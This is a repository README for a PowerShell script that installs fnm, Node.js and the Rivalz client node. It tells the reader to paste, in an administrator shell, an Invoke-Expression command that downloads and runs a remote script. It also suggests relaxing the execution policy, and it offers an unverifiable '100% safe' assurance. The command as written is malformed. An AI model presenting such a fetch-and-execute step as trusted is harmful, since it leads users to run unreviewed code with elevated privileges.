# PowerShell Setup Script

This repository contains a PowerShell script to automate the installation of Node.js (using Fast Node Manager) and the Rivalz client node. This script is 100% safe to use, does not steal data or cause harm to your system.

## What Does This Script Do?
- Installs **Fast Node Manager (fnm)** using Windows Package Manager (**winget**). (If not already installed)
- Restarts uout shell to ensure the **Fast Node Manage (fnm)** variable os recognized by your shell after installation.
- Configures **fnm** environment to automatically use Node.js when changing directories.
- Installs **Node.js v22.9.0** (if not already installed).
- Verifies installed versions of Node.js and npm.
- Installs the latest version of the **Rivalz client node**.
- Runs the Rivalz node.

## How to Run the Script

### Step 1: Run your powershell in administrator mode, then copy and paste the command below in the terminall
```powershell
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Py-DragonXx/Rivalz-CLI/main/rivalznode.ps1
```
### Step 2: Set Execution Policy (Accept with Y, on first run of the script)

OR

Before running scripts on your system, ensure your PowerShell execution policy allows it. You can do this by opening PowerShell as an administrator and running.

```powershell
Set-ExecutionPolicy RemoteSigned
